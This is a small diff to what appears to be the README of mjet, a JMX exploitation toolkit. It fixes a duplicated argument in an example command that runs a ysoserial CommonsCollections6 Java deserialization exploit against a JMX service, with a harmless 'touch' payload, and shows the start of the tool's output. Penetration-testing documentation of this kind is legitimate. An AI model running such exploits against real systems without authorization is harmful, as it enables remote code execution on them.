@@ -212,7 +212,7 @@ minmaxer@prellermbp:~/mjet$
 Exploit Java deserialization with ysoserial on target:
 
 ```
-h0ng10@rocksteady:~/mjet$ jython mjet.py 10.55.90.81 2222 super_secret deserialize deserialize CommonsCollections6 "touch /tmp/filename"
+h0ng10@rocksteady:~/mjet$ jython mjet.py 10.55.90.81 2222 super_secret deserialize CommonsCollections6 "touch /tmp/filename"
 mJET - MOGWAI LABS JMX Exploitation Toolkit
 =======================================
 [+] Connecting to: service:jmx:rmi:///jndi/rmi://10.55.90.81:2222/jmxrmi
